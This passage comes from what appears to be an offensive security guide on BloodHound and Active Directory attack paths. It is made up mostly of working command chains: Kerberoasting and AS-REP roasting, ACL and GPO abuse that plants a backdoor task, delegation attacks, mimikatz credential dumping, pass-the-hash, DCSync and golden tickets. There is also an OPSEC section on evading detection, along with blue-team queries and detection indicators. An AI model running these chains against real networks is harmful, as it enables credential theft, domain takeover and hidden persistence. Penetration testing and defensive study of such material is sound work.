  MATCH (u:User)-[:Owns]->(target)
  WHERE NOT u.name CONTAINS 'ADMIN'
  RETURN u.name, labels(target), target.name
  ```
  :::
::

### Kerberos Attack Queries

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```cypher [Kerberos Attack Discovery]
// ============================================
// AS-REP ROASTABLE USERS
// ============================================
MATCH (u:User {dontreqpreauth: true, enabled: true})
RETURN u.name, u.description

// ============================================
// KERBEROASTABLE USERS WITH PATHS TO DA
// ============================================
MATCH (u:User {hasspn: true, enabled: true})
MATCH p=shortestPath((u)-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"}))
RETURN u.name, u.serviceprincipalnames, length(p) AS PathLength
ORDER BY PathLength ASC

// ============================================
// KERBEROASTABLE USERS — HIGH VALUE
// ============================================
MATCH (u:User {hasspn: true, enabled: true})-[:MemberOf*1..]->(g:Group)
WHERE g.highvalue = true
RETURN u.name, u.serviceprincipalnames, g.name AS HighValueGroup

// ============================================
// CONSTRAINED DELEGATION TARGETS
// ============================================
MATCH (c) 
WHERE c.allowedtodelegate IS NOT NULL
RETURN c.name, c.allowedtodelegate, labels(c)

// ============================================
// RESOURCE-BASED CONSTRAINED DELEGATION
// ============================================
MATCH (c:Computer)
WHERE c.allowedtoact IS NOT NULL
RETURN c.name, c.allowedtoact
```

#code
```cypher
MATCH (u:User {hasspn: true, enabled: true})
RETURN u.name, u.serviceprincipalnames
```
::

### GPO Abuse Queries

::collapsible
**GPO Attack Path Queries**

```cypher [GPO Abuse Queries]
// ============================================
// WHO CAN MODIFY GPOs LINKED TO DAs?
// ============================================
MATCH (u)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(gpo:GPO)
MATCH (gpo)-[:GpLink]->(ou:OU)
MATCH (ou)-[:Contains*1..]->(target)
WHERE target:Computer OR target:User
RETURN u.name AS CanModifyGPO, gpo.name AS GPO, collect(DISTINCT target.name) AS AffectedObjects

// ============================================
// GPOs LINKED TO DOMAIN CONTROLLERS OU
// ============================================
MATCH (gpo:GPO)-[:GpLink]->(ou:OU)
WHERE ou.name =~ '(?i).*domain controllers.*'
RETURN gpo.name, ou.name

// ============================================
// WHO HAS WRITE ACCESS TO GPOs?
// ============================================
MATCH (u)-[:GenericAll|GenericWrite]->(gpo:GPO)
RETURN u.name, gpo.name

// ============================================
// GPOs THAT AFFECT COMPUTERS WITH DA SESSIONS
// ============================================
MATCH (gpo:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer)-[:HasSession]->(u:User)-[:MemberOf*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
RETURN gpo.name AS GPO, c.name AS Computer, u.name AS DomainAdmin
```
::

---

## Phase 6 — Exploiting Discovered Attack Paths

::warning
BloodHound shows you the path — now you need to **walk it**. Each edge type has specific exploitation techniques and tools.
::

### ACL Abuse Exploitation

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="GenericAll"}
  ```powershell [GenericAll Exploitation]
  # ============================================
  # GenericAll ON USER → Reset their password
  # ============================================
  
  # PowerView
  Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)
  
  # net command
  net user TargetUser Pwned123! /domain
  
  # Impacket (from Linux)
  python3 changepasswd.py corp.local/jsmith:'Password123!'@dc01.corp.local -newpass 'Pwned123!' -target TargetUser
  
  # ============================================
  # GenericAll ON USER → Targeted Kerberoasting
  # ============================================
  # Set SPN on user (if they don't have one)
  
  # PowerView
  Set-DomainObject -Identity TargetUser -SET @{serviceprincipalname='nonexistent/YOURSERVICE'}
  
  # Request ticket
  Rubeus.exe kerberoast /user:TargetUser /outfile:hash.txt
  
  # Crack with hashcat
  hashcat -m 13100 hash.txt wordlist.txt
  
  # Clean up — remove the SPN
  Set-DomainObject -Identity TargetUser -Clear serviceprincipalname
  
  # ============================================
  # GenericAll ON GROUP → Add yourself as member
  # ============================================
  
  # PowerView
  Add-DomainGroupMember -Identity "Domain Admins" -Members "jsmith"
  
  # net command
  net group "Domain Admins" jsmith /add /domain
  
  # Impacket (from Linux)
  python3 dacledit.py corp.local/jsmith:'Password123!' -target-dn "CN=Domain Admins,CN=Users,DC=corp,DC=local" -action write -rights FullControl -principal jsmith
  
  # ============================================
  # GenericAll ON COMPUTER → RBCD Attack
  # ============================================
  # Write msDS-AllowedToActOnBehalfOfOtherIdentity
  
  # Create a machine account
  python3 addcomputer.py -computer-name 'FAKECOMP$' -computer-pass 'FakePass123!' corp.local/jsmith:'Password123!'
  
  # Set RBCD
  python3 rbcd.py -delegate-to 'TARGETCOMP$' -delegate-from 'FAKECOMP$' -action write corp.local/jsmith:'Password123!'
  
  # Get impersonated ticket
  python3 getST.py -spn cifs/TARGETCOMP.corp.local -impersonate Administrator corp.local/'FAKECOMP$':'FakePass123!'
  
  # Use ticket
  export KRB5CCNAME=Administrator.ccache
  python3 psexec.py -k -no-pass corp.local/Administrator@TARGETCOMP.corp.local
  ```
  :::

  :::tabs-item{icon="i-lucide-pen-line" label="WriteDacl / WriteOwner"}
  ```powershell [WriteDacl & WriteOwner Exploitation]
  # ============================================
  # WriteDacl → Grant yourself GenericAll first
  # ============================================
  
  # PowerView — Add GenericAll ACE for yourself
  Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity jsmith -Rights All
  
  # Impacket dacledit (from Linux)
  python3 dacledit.py -action write -rights FullControl -principal jsmith -target "Domain Admins" corp.local/jsmith:'Password123!'
  
  # Now you have GenericAll → use GenericAll exploitation above
  
  # ============================================
  # WriteOwner → Change owner, then WriteDacl
  # ============================================
  
  # Step 1: Change ownership to yourself
  # PowerView
  Set-DomainObjectOwner -Identity "TargetGroup" -OwnerIdentity "jsmith"
  
  # Impacket owneredit (from Linux)
  python3 owneredit.py -action write -new-owner jsmith -target "TargetGroup" corp.local/jsmith:'Password123!'
  
  # Step 2: As owner, grant yourself WriteDacl
  Add-DomainObjectAcl -TargetIdentity "TargetGroup" -PrincipalIdentity jsmith -Rights DCSync
  
  # Step 3: Now use your new permissions
  ```
  :::

  :::tabs-item{icon="i-lucide-key" label="ForceChangePassword / AddMember"}
  ```powershell [ForceChangePassword & AddMember]
  # ============================================
  # ForceChangePassword
  # ============================================
  
  # PowerView (change target's password)
  Set-DomainUserPassword -Identity TargetUser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
  
  # Impacket
  python3 changepasswd.py corp.local/jsmith:'Password123!'@dc01.corp.local -newpass 'NewPass123!' -target TargetUser
  
  # rpcclient (from Linux)
  rpcclient -U 'jsmith%Password123!' dc01.corp.local -c "setuserinfo2 TargetUser 23 'NewPass123!'"
  
  # ============================================
  # AddMember → Add user to group
  # ============================================
  
  # PowerView
  Add-DomainGroupMember -Identity "TargetGroup" -Members "jsmith"
  
  # Verify
  Get-DomainGroupMember -Identity "TargetGroup" | Select MemberName
  
  # net command
  net group "TargetGroup" jsmith /add /domain
  
  # Impacket (from Linux)
  python3 net.py corp.local/jsmith:'Password123!' -target dc01.corp.local group addmem "TargetGroup" "jsmith"
  ```
  :::
::

### Kerberos Attack Exploitation

::tabs
  :::tabs-item{icon="i-lucide-ticket" label="Kerberoasting"}
  ```bash [Kerberoasting Exploitation]
  # ============================================
  # BloodHound found: Kerberoastable users with paths to DA
  # ============================================
  
  # --- FROM WINDOWS ---
  
  # Rubeus — Request all Kerberoastable tickets
  .\Rubeus.exe kerberoast /outfile:kerberoast_hashes.txt
  
  # Rubeus — Target specific user found by BloodHound
  .\Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt
  
  # Rubeus — RC4 downgrade (easier to crack)
  .\Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
  
  # PowerView + Invoke-Kerberoast
  Import-Module .\PowerView.ps1
  Invoke-Kerberoast -OutputFormat hashcat | Select Hash | Out-File hashes.txt
  
  # --- FROM LINUX ---
  
  # Impacket GetUserSPNs
  python3 GetUserSPNs.py corp.local/jsmith:'Password123!' -dc-ip 10.0.0.50 -request -outputfile kerberoast_hashes.txt
  
  # Target specific user
  python3 GetUserSPNs.py corp.local/jsmith:'Password123!' -dc-ip 10.0.0.50 -request-user svc_sql -outputfile svc_sql_hash.txt
  
  # --- CRACK THE HASHES ---
  
  # Hashcat (mode 13100 for Kerberos 5 TGS-REP)
  hashcat -m 13100 kerberoast_hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
  
  # John the Ripper
  john --format=krb5tgs --wordlist=/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt kerberoast_hashes.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-unlock" label="AS-REP Roasting"}
  ```bash [AS-REP Roasting Exploitation]
  # ============================================
  # BloodHound found: Users with DONT_REQ_PREAUTH
  # ============================================
  
  # --- FROM WINDOWS ---
  
  # Rubeus
  .\Rubeus.exe asreproast /outfile:asrep_hashes.txt
  
  # Target specific user
  .\Rubeus.exe asreproast /user:svc_backup /outfile:svc_backup_asrep.txt
  
  # --- FROM LINUX ---
  
  # Impacket GetNPUsers (no creds needed for this!)
  python3 GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip 10.0.0.50 -format hashcat -outputfile asrep_hashes.txt
  
  # With credentials (find all AS-REP roastable)
  python3 GetNPUsers.py corp.local/jsmith:'Password123!' -dc-ip 10.0.0.50 -request -format hashcat -outputfile asrep_hashes.txt
  
  # --- CRACK ---
  
  # Hashcat (mode 18200 for Kerberos 5 AS-REP)
  hashcat -m 18200 asrep_hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-repeat" label="Delegation Attacks"}
  ```bash [Delegation Attack Exploitation]
  # ============================================
  # UNCONSTRAINED DELEGATION
  # BloodHound found: Non-DC computers with unconstrained delegation
  # ============================================
  
  # If you compromise a machine with unconstrained delegation:
  
  # Step 1: Monitor for incoming TGTs (Rubeus on compromised host)
  .\Rubeus.exe monitor /interval:5 /nowrap
  
  # Step 2: Force authentication (SpoolSample / PrinterBug)
  # Trigger DC to authenticate to compromised machine
  .\SpoolSample.exe DC01.corp.local COMPROMISED.corp.local
  
  # Step 3: Capture DC's TGT and use it
  .\Rubeus.exe ptt /ticket:BASE64_TICKET
  
  # Step 4: DCSync with the DC's TGT
  mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
  
  # ============================================
  # CONSTRAINED DELEGATION
  # BloodHound found: Users/computers allowed to delegate
  # ============================================
  
  # From Windows (Rubeus)
  # Request ticket using the constrained delegation
  .\Rubeus.exe s4u /user:svc_web$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.corp.local /ptt
  
  # From Linux (Impacket)
  python3 getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/svc_web$:'Password123!'
  export KRB5CCNAME=Administrator.ccache
  python3 psexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
  
  # ============================================
  # RESOURCE-BASED CONSTRAINED DELEGATION (RBCD)
  # BloodHound found: GenericAll/GenericWrite on computer
  # ============================================
  
  # Step 1: Create machine account
  python3 addcomputer.py -computer-name 'EVIL$' -computer-pass 'Evil123!' corp.local/jsmith:'Password123!'
  
  # Step 2: Configure RBCD
  python3 rbcd.py -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write corp.local/jsmith:'Password123!'
  
  # Step 3: Impersonate admin
  python3 getST.py -spn cifs/TARGET.corp.local -impersonate Administrator corp.local/'EVIL$':'Evil123!'
  
  # Step 4: Use ticket
  export KRB5CCNAME=Administrator.ccache
  python3 smbexec.py -k -no-pass corp.local/Administrator@TARGET.corp.local
  ```
  :::
::

### Session Exploitation (AdminTo + HasSession)

::code-preview
---
class: "[&>div]:*:my-0 [&>div]:*:w-full"
---

```powershell [Session Hijacking Chain]
# ============================================
# BloodHound Path:
# OwnedUser -[AdminTo]-> WORKSTATION01 -[HasSession]-> DomainAdmin
# ============================================

# Thinking:
# 1. We have local admin on WORKSTATION01
# 2. A Domain Admin has a session on WORKSTATION01
# 3. Dump credentials from WORKSTATION01 → get DA creds

# --- STEP 1: Get a shell on WORKSTATION01 ---

# PsExec (Impacket)
python3 psexec.py corp.local/jsmith:'Password123!'@WORKSTATION01.corp.local

# WMIExec
python3 wmiexec.py corp.local/jsmith:'Password123!'@WORKSTATION01.corp.local

# Evil-WinRM (if WinRM is open)
evil-winrm -i WORKSTATION01.corp.local -u jsmith -p 'Password123!'

# --- STEP 2: Dump credentials ---

# Mimikatz — dump logon sessions
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Mimikatz — dump specific user
mimikatz # sekurlsa::logonpasswords /user:DomainAdmin

# SharpDump (minidump LSASS)
.\SharpDump.exe

# From Linux — CrackMapExec
crackmapexec smb WORKSTATION01.corp.local -u jsmith -p 'Password123!' -M lsassy

# --- STEP 3: Use stolen DA credentials ---

# Pass-the-Hash with DA's NTLM
python3 psexec.py -hashes ':DA_NTLM_HASH' corp.local/DomainAdmin@DC01.corp.local

# DCSync with DA creds
python3 secretsdump.py corp.local/DomainAdmin:'DAPassword!'@DC01.corp.local -just-dc-ntlm
```

#code
```bash
# Typical session exploitation chain
python3 psexec.py user:pass@workstation
mimikatz # sekurlsa::logonpasswords
python3 psexec.py -hashes ':hash' DA@DC
```
::

### DCSync Attack

::caution
DCSync is often the **final step** to domain dominance. It replicates all password hashes from the Domain Controller — equivalent to stealing the `NTDS.dit` file.
::

```bash [DCSync Exploitation]
# ============================================
# BloodHound found: User has DCSync rights
# (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All)
# ============================================

# --- FROM WINDOWS (Mimikatz) ---

# Dump all hashes
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# Dump specific user (krbtgt for Golden Ticket)
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Dump specific user (Administrator)
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator

# --- FROM LINUX (Impacket) ---

# Dump all hashes
python3 secretsdump.py corp.local/UserWithDCSync:'Password123!'@dc01.corp.local -just-dc-ntlm

# Dump with full output (including Kerberos keys)
python3 secretsdump.py corp.local/UserWithDCSync:'Password123!'@dc01.corp.local

# Dump using pass-the-hash
python3 secretsdump.py -hashes ':NTLM_HASH' corp.local/UserWithDCSync@dc01.corp.local -just-dc-ntlm

# Dump specific user
python3 secretsdump.py corp.local/UserWithDCSync:'Password123!'@dc01.corp.local -just-dc-user krbtgt

# --- POST DCSYNC: GOLDEN TICKET ---

# Create Golden Ticket with krbtgt hash
python3 ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXXXX -domain corp.local Administrator

# Use the golden ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py -k -no-pass corp.local/Administrator@dc01.corp.local
```

---

## Phase 7 — Common Attack Path Scenarios

::note
These are **real-world attack paths** frequently discovered by BloodHound in enterprise environments. Each scenario includes the BloodHound discovery and the exploitation commands.
::

### Scenario 1: Nested Group Path to DA

::steps{level="4"}

#### BloodHound Discovery

```
JSMITH@CORP.LOCAL
    └──[MemberOf]──► IT_SUPPORT@CORP.LOCAL
                         └──[MemberOf]──► SERVER_ADMINS@CORP.LOCAL
                                              └──[AdminTo]──► SRV01.CORP.LOCAL
                                                                  └──[HasSession]──► DADMIN@CORP.LOCAL
                                                                                         └──[MemberOf]──► DOMAIN ADMINS@CORP.LOCAL
```

#### Exploitation Chain

```bash [Scenario 1 Commands]
# Step 1: jsmith is already compromised
# Step 2: jsmith is member of IT_SUPPORT → member of SERVER_ADMINS
#         This means jsmith is LOCAL ADMIN on SRV01

# Step 3: Get shell on SRV01
python3 psexec.py corp.local/jsmith:'Password123!'@SRV01.corp.local

# Step 4: Dump credentials (DADMIN has active session)
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Step 5: Use DADMIN's credentials
python3 psexec.py -hashes ':DADMIN_NTLM_HASH' corp.local/DADMIN@DC01.corp.local

# Step 6: DCSync for persistence
python3 secretsdump.py -hashes ':DADMIN_NTLM_HASH' corp.local/DADMIN@DC01.corp.local -just-dc-ntlm
```

::

### Scenario 2: ACL Chain to DA

::steps{level="4"}

#### BloodHound Discovery

```
JSMITH@CORP.LOCAL
    └──[GenericWrite]──► SVC_SQL@CORP.LOCAL
                              └──[MemberOf]──► DB_ADMINS@CORP.LOCAL
                                                    └──[GenericAll]──► DOMAIN ADMINS@CORP.LOCAL
```

#### Exploitation Chain

```bash [Scenario 2 Commands]
# Step 1: GenericWrite on SVC_SQL → Set SPN for Kerberoasting
# PowerView
Set-DomainObject -Identity svc_sql -SET @{serviceprincipalname='fakeSPN/YOURSERVICE'}

# Step 2: Kerberoast SVC_SQL
python3 GetUserSPNs.py corp.local/jsmith:'Password123!' -dc-ip 10.0.0.50 -request-user svc_sql -outputfile svc_sql.hash

# Step 3: Crack the hash
hashcat -m 13100 svc_sql.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt

# Step 4: SVC_SQL is member of DB_ADMINS which has GenericAll on DOMAIN ADMINS
# Now acting as SVC_SQL — add jsmith to Domain Admins
python3 net.py corp.local/svc_sql:'CrackedPass!'@dc01.corp.local group addmem "Domain Admins" "jsmith"

# Step 5: Verify
python3 psexec.py corp.local/jsmith:'Password123!'@DC01.corp.local
whoami
# corp\jsmith (as Domain Admin)

# Step 6: Clean up — remove SPN
Set-DomainObject -Identity svc_sql -Clear serviceprincipalname
```

::

### Scenario 3: GPO Abuse to DA

::steps{level="4"}

#### BloodHound Discovery

```
JSMITH@CORP.LOCAL
    └──[GenericAll]──► WORKSTATION_POLICY (GPO)
                            └──[GpLink]──► WORKSTATIONS OU
                                              └──[Contains]──► WS01.CORP.LOCAL
                                                                   └──[HasSession]──► DADMIN@CORP.LOCAL
```

#### Exploitation Chain

```bash [Scenario 3 Commands]
# Step 1: jsmith has GenericAll on a GPO linked to Workstations OU
# Step 2: Modify GPO to add jsmith as local admin on all workstations

# Using SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jsmith --GPOName "WORKSTATION_POLICY"

# Or add a scheduled task via GPO
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup Administrators jsmith /add" --GPOName "WORKSTATION_POLICY"

# Using pyGPOAbuse (from Linux)
python3 pygpoabuse.py corp.local/jsmith:'Password123!' -gpo-id "GPO_GUID" -f -dc-ip 10.0.0.50

# Step 3: Force GPO update on target (or wait)
# From target machine (if you have any access):
gpupdate /force

# Step 4: Now local admin on WS01 → dump DADMIN session
python3 psexec.py corp.local/jsmith:'Password123!'@WS01.corp.local
mimikatz # sekurlsa::logonpasswords

# Step 5: Use DA credentials
python3 psexec.py -hashes ':DADMIN_HASH' corp.local/DADMIN@DC01.corp.local
```

::

### Scenario 4: LAPS Password Reading

::steps{level="4"}

#### BloodHound Discovery

```
JSMITH@CORP.LOCAL
    └──[MemberOf]──► HELPDESK@CORP.LOCAL
                          └──[ReadLAPSPassword]──► WS05.CORP.LOCAL
                                                        └──[HasSession]──► SRVADMIN@CORP.LOCAL
                                                                               └──[MemberOf]──► SERVER ADMINS → ... → DA
```

#### Exploitation Chain

```bash [Scenario 4 Commands]
# Step 1: jsmith is in HELPDESK group which can read LAPS passwords
# Read LAPS password for WS05

# PowerView
Get-DomainComputer WS05 -Properties ms-Mcs-AdmPwd

# CrackMapExec (from Linux)
crackmapexec ldap dc01.corp.local -u jsmith -p 'Password123!' -M laps

# LAPSDumper (from Linux)
python3 laps.py -u jsmith -p 'Password123!' -d corp.local -dc-ip 10.0.0.50

# Step 2: Login to WS05 with local admin LAPS password
python3 psexec.py ./Administrator:'LAPS_PASSWORD'@WS05.corp.local

# Step 3: Dump SRVADMIN session
mimikatz # sekurlsa::logonpasswords

# Step 4: Continue the chain with SRVADMIN credentials...
```

::

---

## Phase 8 — BloodHound for Defense (Blue Team Queries)

::tip
BloodHound is equally valuable for **defenders**. Run these queries to find and fix dangerous configurations before attackers do.
::

::collapsible
**Blue Team — Hardening Queries**

```cypher [Blue Team Cypher Queries]
// ============================================
// FIND ALL PATHS TO DOMAIN ADMIN (FIX THESE!)
// ============================================
MATCH p=shortestPath(
  (u:User {enabled: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
)
WHERE NOT u.name STARTS WITH 'ADMIN'
RETURN u.name, length(p) AS PathLength
ORDER BY PathLength ASC

// ============================================
// USERS WITH EXCESSIVE PRIVILEGES
// ============================================
MATCH (u:User)-[r]->(target)
WHERE type(r) IN ['GenericAll','GenericWrite','WriteDacl','WriteOwner','ForceChangePassword']
AND u.enabled = true
AND NOT u.name =~ '(?i).*admin.*'
RETURN u.name, type(r) AS Permission, target.name, labels(target)
ORDER BY u.name

// ============================================
// MACHINES WITH UNCONSTRAINED DELEGATION (SHOULD BE DCs ONLY)
// ============================================
MATCH (c:Computer {unconstraineddelegation: true})
WHERE NOT c.name CONTAINS 'DC'
RETURN c.name, c.operatingsystem

// ============================================
// STALE ADMIN ACCOUNTS (haven't logged in 90 days)
// ============================================
MATCH (u:User {enabled: true, admincount: true})
WHERE u.lastlogon < (datetime().epochSeconds - (90 * 86400))
RETURN u.name, u.lastlogon

// ============================================
// DOMAIN USERS WITH LOCAL ADMIN (VERY DANGEROUS)
// ============================================
MATCH (g:Group {name: "DOMAIN USERS@CORP.LOCAL"})-[:AdminTo]->(c:Computer)
RETURN c.name

// ============================================
// KERBEROASTABLE SERVICE ACCOUNTS IN ADMIN GROUPS
// ============================================
MATCH (u:User {hasspn: true, enabled: true})-[:MemberOf*1..]->(g:Group {admincount: true})
RETURN u.name, u.serviceprincipalnames, g.name
// FIX: Use gMSA accounts or rotate passwords

// ============================================
// COMPUTERS WITHOUT LAPS
// ============================================
MATCH (c:Computer {haslaps: false, enabled: true})
WHERE c.operatingsystem =~ '(?i).*windows.*'
RETURN c.name, c.operatingsystem

// ============================================
// COUNT: Total attack paths to DA
// ============================================
MATCH p=shortestPath(
  (u:User {enabled: true})-[*1..]->(g:Group {name: "DOMAIN ADMINS@CORP.LOCAL"})
)
WHERE u <> g
RETURN count(DISTINCT u) AS UsersWithPathToDA
```
::

---

## Phase 9 — Tips, Tricks & OPSEC

### Collection OPSEC

::accordion
  :::accordion-item{icon="i-lucide-eye-off" label="Stealth Collection Techniques"}
  ```powershell [OPSEC Collection]
  # ============================================
  # STEALTH MODE — Only queries Domain Controllers
  # ============================================
  .\SharpHound.exe --CollectionMethods DCOnly --Stealth
  
  # ============================================
  # THROTTLE — Slow down to avoid detection
  # ============================================
  .\SharpHound.exe --CollectionMethods All --Throttle 2000 --Jitter 50
  
  # ============================================
  # EXCLUDE DCs from session enum (noisy)
  # ============================================
  .\SharpHound.exe --CollectionMethods All --ExcludeDomainControllers
  
  # ============================================
  # USE LDAPS (encrypted — harder to inspect)
  # ============================================
  .\SharpHound.exe --CollectionMethods All --SecureLDAP
  
  # ============================================
  # RANDOM FILENAMES (avoid signature detection)
  # ============================================
  .\SharpHound.exe --CollectionMethods All --RandomizeFilenames --EncryptZip --ZipPassword "s3cret"
  
  # ============================================
  # IN-MEMORY EXECUTION (avoid dropping to disk)
  # ============================================
  # Load SharpHound reflectively via C2
  # Cobalt Strike:
  # execute-assembly /path/to/SharpHound.exe --CollectionMethods All --NoSaveCache
  
  # ============================================
  # ADEXPLORER METHOD (most stealthy)
  # ============================================
  # Use signed Microsoft binary — no AV trigger
  .\ADExplorer.exe -snapshot "" snapshot.dat
  # Convert offline on attacker machine
  ```
  :::

  :::accordion-item{icon="i-lucide-alert-triangle" label="Detection Indicators (What Blue Team Sees)"}
  ```
  DETECTION INDICATORS FOR BLOODHOUND COLLECTION
  ═══════════════════════════════════════════════════
  
  ► LDAP Queries (All methods)
    - High volume of LDAP queries from single workstation
    - Queries for sensitive attributes (adminCount, msDS-AllowedToActOnBehalfOfOtherIdentity)
    - Event ID 1644 (expensive LDAP queries — if enabled)
  
  ► Session Enumeration
    - NetSessionEnum (NetAPI32) calls to many computers
    - Event ID 4624 (Logon events) reviewed in correlation
    - Network connections to port 445 on many hosts
  
  ► Local Admin Enumeration
    - SAM-R queries to enumerate local group membership
    - Event ID 4799 (security group membership enumerated)
    - Connections to SAMR named pipe on remote hosts
  
  ► ACL Enumeration
    - Large number of LDAP queries for nTSecurityDescriptor
    - May generate Event ID 4662 (AD object access)
  
  ► DETECTIONS TO WATCH:
    - ATA/Azure ATP alerts for "Reconnaissance using SAMR"
    - CrowdStrike/SentinelOne SharpHound process detection
    - Honey accounts queried (canary accounts with fake SPNs)
  ```
  :::
::

### Useful BloodHound Keyboard Shortcuts

| Shortcut | Action |
| --- | --- |
| `Ctrl + Enter` | Execute Cypher query |
| `Ctrl + Shift + I` | Open developer tools |
| `Space` | Play/pause graph layout |
| `Ctrl + A` | Select all nodes |
| `Backspace` | Go back |
| `Right-click node` | Node options (mark owned, high value) |
| `Left-click edge` | View edge details and abuse info |
| `Scroll` | Zoom in/out |

---

## Complete Attack Playbook — Start to Finish

::collapsible
**Full BloodHound Engagement Playbook**

```bash [Complete Playbook]
# ════════════════════════════════════════════
# PHASE 1: COLLECTION
# ════════════════════════════════════════════

# From Linux (initial access with creds)
bloodhound-python -u 'jsmith' -p 'Password123!' -d corp.local -ns 10.0.0.50 -c All --zip

# From Windows (domain-joined)
.\SharpHound.exe --CollectionMethods All --Stealth

# ════════════════════════════════════════════
# PHASE 2: IMPORT & INITIAL ANALYSIS
# ════════════════════════════════════════════

# Start Neo4j + BloodHound
sudo neo4j start && bloodhound

# Import data (drag & drop ZIP)
# Mark compromised user as Owned
# Run: "Shortest Paths to Domain Admins from Owned Principals"

# ════════════════════════════════════════════
# PHASE 3: IDENTIFY QUICK WINS
# ════════════════════════════════════════════

# Run these queries in order:
# 1. "Find Kerberoastable Members of High Value Groups"
# 2. "Find AS-REP Roastable Users"
# 3. "Find Computers where Domain Users are Local Admin"
# 4. "Shortest Paths to Domain Admins from Owned Principals"

# ════════════════════════════════════════════
# PHASE 4: KERBEROAST QUICK WIN
# ════════════════════════════════════════════

# If Kerberoastable users found with paths to DA:
python3 GetUserSPNs.py corp.local/jsmith:'Password123!' -dc-ip 10.0.0.50 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt rockyou.txt

# ════════════════════════════════════════════
# PHASE 5: FOLLOW THE ATTACK PATH
# ════════════════════════════════════════════

# BloodHound shows: jsmith → AdminTo → WS05 → HasSession → DADMIN
# Execute:
python3 psexec.py corp.local/jsmith:'Password123!'@WS05.corp.local

# Dump creds
mimikatz # sekurlsa::logonpasswords

# ════════════════════════════════════════════
# PHASE 6: DOMAIN ADMIN
# ════════════════════════════════════════════

# Use DA creds
python3 psexec.py -hashes ':HASH' corp.local/DADMIN@DC01.corp.local

# DCSync for all hashes
python3 secretsdump.py -hashes ':HASH' corp.local/DADMIN@DC01.corp.local -just-dc-ntlm

# ════════════════════════════════════════════
# PHASE 7: PERSISTENCE (if in scope)
# ════════════════════════════════════════════

# Golden Ticket
python3 ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXX -domain corp.local Administrator

# ════════════════════════════════════════════
# PHASE 8: DOCUMENT EVERYTHING
# ════════════════════════════════════════════

# Export BloodHound paths as images
# Document each step with timestamps
# Record all credentials found (for report)
```
::

---

## References & Resources

::card-group
  ::card
  ---
  title: BloodHound Official Docs
  icon: i-simple-icons-readthedocs
  to: https://bloodhound.readthedocs.io/
  target: _blank
  ---
  Official BloodHound documentation covering installation, collectors, and usage.
  ::

  ::card
  ---
  title: SpecterOps Blog
  icon: i-lucide-newspaper
  to: https://posts.specterops.io/
  target: _blank
  ---
  Research blog from the creators of BloodHound — attack path analysis and AD security.
  ::

  ::card
  ---
  title: WADComs
  icon: i-simple-icons-github
  to: https://wadcoms.github.io/
  target: _blank
  ---
  Interactive cheat sheet for Windows/AD offensive commands — organized by situation.
  ::

  ::card
  ---
  title: HackTricks - Active Directory
  icon: i-simple-icons-gitbook
  to: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
  target: _blank
  ---
  Comprehensive AD attack methodology reference with BloodHound integration.
  ::

  ::card
  ---
  title: The Hacker Recipes
  icon: i-lucide-book-open
  to: https://www.thehacker.recipes/ad/movement
  target: _blank
  ---
  Structured AD attack playbook — movement, persistence, and credential theft techniques.
  ::

  ::card
  ---
  title: Compass Security BloodHound Tips
  icon: i-lucide-compass
  to: https://blog.compass-security.com/tag/bloodhound/
  target: _blank
  ---
  Advanced BloodHound tips, custom queries, and real-world engagement findings.
  ::
::

::warning
**Legal & Ethical Notice:** BloodHound and all associated attack techniques must only be used during **authorized penetration tests** or **red team engagements** with explicit written permission. Unauthorized access to Active Directory environments is a criminal offense. Always follow your Rules of Engagement (RoE).
::